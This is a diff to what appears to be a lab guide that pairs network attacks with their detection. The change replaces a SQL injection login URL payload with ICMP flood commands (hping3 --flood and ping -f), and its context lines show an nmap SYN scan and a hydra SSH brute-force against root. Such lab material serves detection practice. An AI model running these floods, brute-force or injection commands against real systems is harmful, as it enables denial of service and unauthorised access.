@@ -204,10 +204,15 @@ nmap -sS <Target-IP>
 
 ---
 
-## SQL Injection
+### ICMP Flood
 
+```bash
+sudo hping3 --icmp --flood <Target-IP>
 ```
-http://target/login.php?id=' OR 1=1--
+OR 
+
+```bash
+ping -f <Target-IP>
 ```
 
 ---
@@ -288,10 +293,10 @@ hydra -l root -P rockyou.txt ssh://<Target-IP>
 
 ---
 
-## SQL Injection Detection
+## ICMP Flood Detection
 
 <p align="center">
-<img src="images/sqli.png" width="900">
+<img src="images/icmp.png" width="900">
 </p>
 
 ---
